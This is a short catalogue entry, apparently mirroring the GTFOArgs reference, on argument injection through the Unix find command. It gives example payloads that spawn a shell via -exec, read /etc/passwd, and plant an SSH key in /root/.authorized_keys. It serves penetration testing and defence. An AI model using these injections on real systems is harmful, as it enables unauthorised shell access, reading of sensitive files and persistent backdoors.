---
trust_level: community
id: argument-injection-find
namespace: argument:injection:find
name: find
description: Argument injection via find
version: 1.0.0
capabilities:
- security.execution.command
- system.file.read
- system.file.write
platforms:
- cross-platform
techniques:
- execution
- discovery
- exfiltration
execution:
  template: find
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: Can be used to execute arbitrary commands on a system and spawn shells
    either indirectly
  command: 'find . -name i_do_not_exist -or -exec perl -e ''exec sh'' ; -quit '
- description: or directly.
  command: 'find . -exec /bin/sh ; -quit '
- description: Can be used to execute arbitrary commands on a system.
  command: 'find . -name i_do_not_exist -or -exec ls ; -quit '
- description: Reading of files is possible by executing cat.
  command: 'find /etc/passwd -exec cat {} ; '
- description: Find has various capabilities to write to files and it is recommended
    to read the manual for more details, especially its fprintf and 'UNUSUAL FILENAMES'
    sections.
  command: 'find . -fprintf /root/.authorized_keys ''ssh-rsa ...'' -quit '
references:
- label: GTFOArgs
  url: https://gtfoargs.github.io/gtfoargs/find/
features:
- file-system
- local
- pipes-stdin
- stealth
---

# find

GTFOArgs entry for find. This binary can be used to inject arguments for execution, file operations, or other capabilities.
